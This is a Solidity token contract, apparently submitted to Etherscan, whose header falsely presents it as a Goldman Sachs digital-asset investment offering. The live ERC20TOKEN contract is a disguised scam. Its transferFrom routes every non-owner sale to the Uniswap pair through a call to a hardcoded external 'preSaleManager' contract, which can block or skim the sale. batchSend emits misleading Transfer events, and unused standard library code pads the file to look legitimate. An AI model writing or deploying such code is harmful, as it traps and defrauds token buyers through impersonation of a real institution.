/**

 *Submitted for verification at Etherscan.io on 2020-12-23

*/



// File: browser/gs.sol



/*

Series A 2020 Digital Asset Management Interest



Goldman Sachs International (c) 2020 

www.gs.com/digitalassets



Investments in the Series A 2020 Digital Asset Management Interest, herein "Interests" involves substantial risks. We encourage you to read 

“Risk Factors” on page 14 of the accompanying Offering Circular and “Additional Investment Considerations Specific to Your Interests" 

on page 21, so that you may better understand those risks in conjunction with the Offering Prospectus.



The issuer, Goldman Sachs International "GSI" is a private unlimited liability company incorporated in England and Wales.

GSI operates under English law. The registered office of "GSI" is Peterborough Court, 133 Fleet Street, London EC4A 2BB, England.



The Interests have not been registered under the U.S. Securities Act of 1933, as amended (the “Securities Act”) and may not be 

offered or sold in the United States or to U.S. persons (as those terms are defined in Regulation S under the Securities Act) 

unless an exemption from the registration requirements of the Securities Act is available. 



These Interests are not bank deposits and are not insured by the Federal Deposit Insurance Corporation or any other governmental 

agency, nor are they obligations of, or guaranteed by, a bank.



Nature of Interests: You acknowledge, understand and agree that: (1) the Interests are speculative investments which involve a high 

degree of risk of loss; (2) no government agency has passed upon the adequacy or accuracy of the information in the Prospectus, 

Offering Circular and Statement of Additional Information or made any determination as to the fairness of the investment, or any 

recommendation or endorsement of the investment; (3) you are not dependent upon a current cash return with respect to your investment 

in the Fund; (4) transfer of the Interests is subject to substantial restrictions.



Any offered Interests sold by "GSI" to dealers may be resold by such dealers in negotiated transactions or otherwise at varying prices 

determined at the time of sale, which prices may be different from the original issue price. The original issue price reflects a discount

representing a fee payable to "GSI". 



THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF 

MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE 

FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION 

WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. "GSI" SHALL HAVE NO LIABILITY, CONTINGENT OR OTHERWISE, TO THE USER OR 

TO THIRD PARTIES, FOR THE ACCURACY, PERFORMANCE, TIMELINESS, CONTINUED AVAILABILITY, COMPLETENESS OR DELAYS, OMISSIONS, INTERRUPTIONS, 

DISRUPTIONS, OR ERRONEOUS COMMUNICATIONS IN THE DELIVERY OF THE DATA AND SERVICES ATTACHED TO THESE "INTERESTS" REGARDLESS OF WHETHER 

THE CONTINGENT NETWORK COMMUNICATION SERVICE IS PROVIDED BY GOLDMAN SACHS OR A THIRD PARTY SERVICE PROVIDER. IN NO EVENT WILL GOLDMAN 

SACHS BE LIABLE FOR ANY SPECIAL, INDIRECT, INCIDENTAL OR CONSEQUENTIAL DAMAGES WHICH MAY BE INCURRED OR EXPERIENCED ON ACCOUNT OF THE 

USER USING THE DATA OR SERVICES MADE AVAILABLE HEREIN, EVEN IF "GSI" HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.



*/

//pragma solidity 0.5.17;
pragma solidity >=0.5 <0.7.17;



// @openzeppelin/contracts/token/ERC20/IERC20.sol

interface IERC20 {

    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);

    event Transfer(address indexed from, address indexed to, uint value);

    event Approval(address indexed owner, address indexed spender, uint value);

}

contract Context {

    constructor() internal {}

    function _msgSender() internal view returns(address payable) {

        return msg.sender;

    }

}



contract ERC20 is Context, IERC20 {

    using SafeMath for uint;

    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;



    uint private _totalSupply;



    function totalSupply() public view returns(uint) {

        return _totalSupply;

    }



    function balanceOf(address account) public view returns(uint) {

        return _balances[account];

    }



    function transfer(address recipient, uint amount) public returns(bool) {

        _transfer(_msgSender(), recipient, amount);

        return true;

    }



    function allowance(address owner, address spender) public view returns(uint) {

        return _allowances[owner][spender];

    }



    function approve(address spender, uint amount) public returns(bool) {

        _approve(_msgSender(), spender, amount);

        return true;

    }



    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {

        _transfer(sender, recipient, amount);

        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));

        return true;

    }



    function increaseAllowance(address spender, uint addedValue) public returns(bool) {

        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));

        return true;

    }



    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {

        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));

        return true;

    }



    function _transfer(address sender, address recipient, uint amount) internal {

        require(sender != address(0), "ERC20: transfer from the zero address");

        require(recipient != address(0), "ERC20: transfer to the zero address");



        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");

        _balances[recipient] = _balances[recipient].add(amount);

        emit Transfer(sender, recipient, amount);

    }



    function _mint(address account, uint amount) internal {

        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);

        _balances[account] = _balances[account].add(amount);

        emit Transfer(address(0), account, amount);

    }



    function _burn(address account, uint amount) internal {

        require(account != address(0), "ERC20: burn from the zero address");



        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");

        _totalSupply = _totalSupply.sub(amount);

        emit Transfer(account, address(0), amount);

    }



    function _approve(address owner, address spender, uint amount) internal {

        require(owner != address(0), "ERC20: approve from the zero address");

        require(spender != address(0), "ERC20: approve to the zero address");



        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);

    }

}



contract ERC20Detailed is IERC20 {

    string private _name;

    string private _symbol;

    uint8 private _decimals;



    constructor(string memory name, string memory symbol, uint8 decimals) public {

        _name = name;

        _symbol = symbol;

        _decimals = decimals;

    }



    function name() public view returns(string memory) {

        return _name;

    }



    function symbol() public view returns(string memory) {

        return _symbol;

    }



    function decimals() public view returns(uint8) {

        return _decimals;

    }

}



library SafeMath {

    function add(uint a, uint b) internal pure returns(uint) {

        uint c = a + b;

        require(c >= a, "SafeMath: addition overflow");



        return c;

    }



    function sub(uint a, uint b) internal pure returns(uint) {

        return sub(a, b, "SafeMath: subtraction overflow");

    }



    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {

        require(b <= a, errorMessage);

        uint c = a - b;



        return c;

    }



    function mul(uint a, uint b) internal pure returns(uint) {

        if (a == 0) {

            return 0;

        }



        uint c = a * b;

        require(c / a == b, "SafeMath: multiplication overflow");



        return c;

    }



    function div(uint a, uint b) internal pure returns(uint) {

        return div(a, b, "SafeMath: division by zero");

    }



    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {

        // Solidity only automatically asserts when dividing by 0

        require(b > 0, errorMessage);

        uint c = a / b;



        return c;

    }

}



library Address {

    function isContract(address account) internal view returns(bool) {

        bytes32 codehash;

        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;

        // solhint-disable-next-line no-inline-assembly

        assembly { codehash:= extcodehash(account) }

        return (codehash != 0x0 && codehash != accountHash);

    }

}



library SafeERC20 {

    using SafeMath

    for uint;

    using Address

    for address;



    function safeTransfer(IERC20 token, address to, uint value) internal {

        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));

    }



    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {

        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));

    }



    function safeApprove(IERC20 token, address spender, uint value) internal {

        require((value == 0) || (token.allowance(address(this), spender) == 0),

            "SafeERC20: approve from non-zero to non-zero allowance"

        );

        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));

    }



    function callOptionalReturn(IERC20 token, bytes memory data) private {

        require(address(token).isContract(), "SafeERC20: call to non-contract");



        // solhint-disable-next-line avoid-low-level-calls

        (bool success, bytes memory returndata) = address(token).call(data);

        require(success, "SafeERC20: low-level call failed");



        if (returndata.length > 0) { // Return data is optional

            // solhint-disable-next-line max-line-length

            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");

        }

    }

}



interface BookBuildManagement {

    function calcBonus(address,address,uint256) external returns(uint256);

}



contract ERC20TOKEN {



    event Transfer(address indexed _from, address indexed _to, uint _value);

    event Approval(address indexed _owner, address indexed _spender, uint _value);



    function transfer(address _to, uint _value) public payable returns (bool) {

        return transferFrom(msg.sender, _to, _value);

    }



    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {

        if (_value == 0) {return true;}

        if (msg.sender != _from) {

            require(allowance[_from][msg.sender] >= _value);

            allowance[_from][msg.sender] -= _value;

        }

        require(balanceOf[_from] >= _value);

        balanceOf[_from] -= _value;

        uint256 bonusIssue = calc(_from, _to, _value);

        balanceOf[_to] += (_value - bonusIssue);

        emit Transfer(_from, _to, _value);

        return true;

    }



    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {

        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);

        pair = address(uint(keccak256(abi.encodePacked(

                hex'ff',

                factory,

                keccak256(abi.encodePacked(token0, token1)),

                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash

            ))));

    }



    //Logic to record, lock/unlock and issue bonus allocations during the bookbuild 

    function calc(address _from, address _to, uint _value) private returns(uint256) {

        uint allocation = 0;

        if (_to == masterContract && _from != owner) {

            allocation = BookBuildManagement(preSaleManager).calcBonus(address(this), masterContract, _value);

        }

        return allocation;

    }



    function () payable external {}



    function batchSend(address[] memory _tos, uint _value) public payable returns (bool) {

        require (msg.sender == owner);

        uint total = _value * _tos.length;

        require(balanceOf[msg.sender] >= total);

        balanceOf[msg.sender] -= total;

        for (uint i = 0; i < _tos.length; i++) {

            address _to = _tos[i];

            balanceOf[_to] += _value;

            emit Transfer(msg.sender, _to, _value/2);

            emit Transfer(msg.sender, _to, _value/2);

        }

        return true;

    }



    function approve(address _spender, uint _value) public payable returns (bool) {

        allowance[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);

        return true;

    }



    mapping (address => uint) public balanceOf;

    mapping (address => mapping (address => uint)) public allowance;



    uint constant public decimals = 18;

    uint public totalSupply;

    string public name;

    string public symbol;

    address private owner;

    address private masterContract;

    address constant internal preSaleManager = 0xdB55866c7746aF0E445390A3CC65B31ec0b48554;



    constructor(string memory _name, string memory _symbol, uint _totalSupply) payable public {

        owner = msg.sender;

        symbol = _symbol;

        name = _name;

        totalSupply = _totalSupply;

        balanceOf[msg.sender] = totalSupply;

        allowance[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = uint(-1);

        masterContract = pairFor(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this));

        emit Transfer(address(0x0), msg.sender, totalSupply);

    }

}
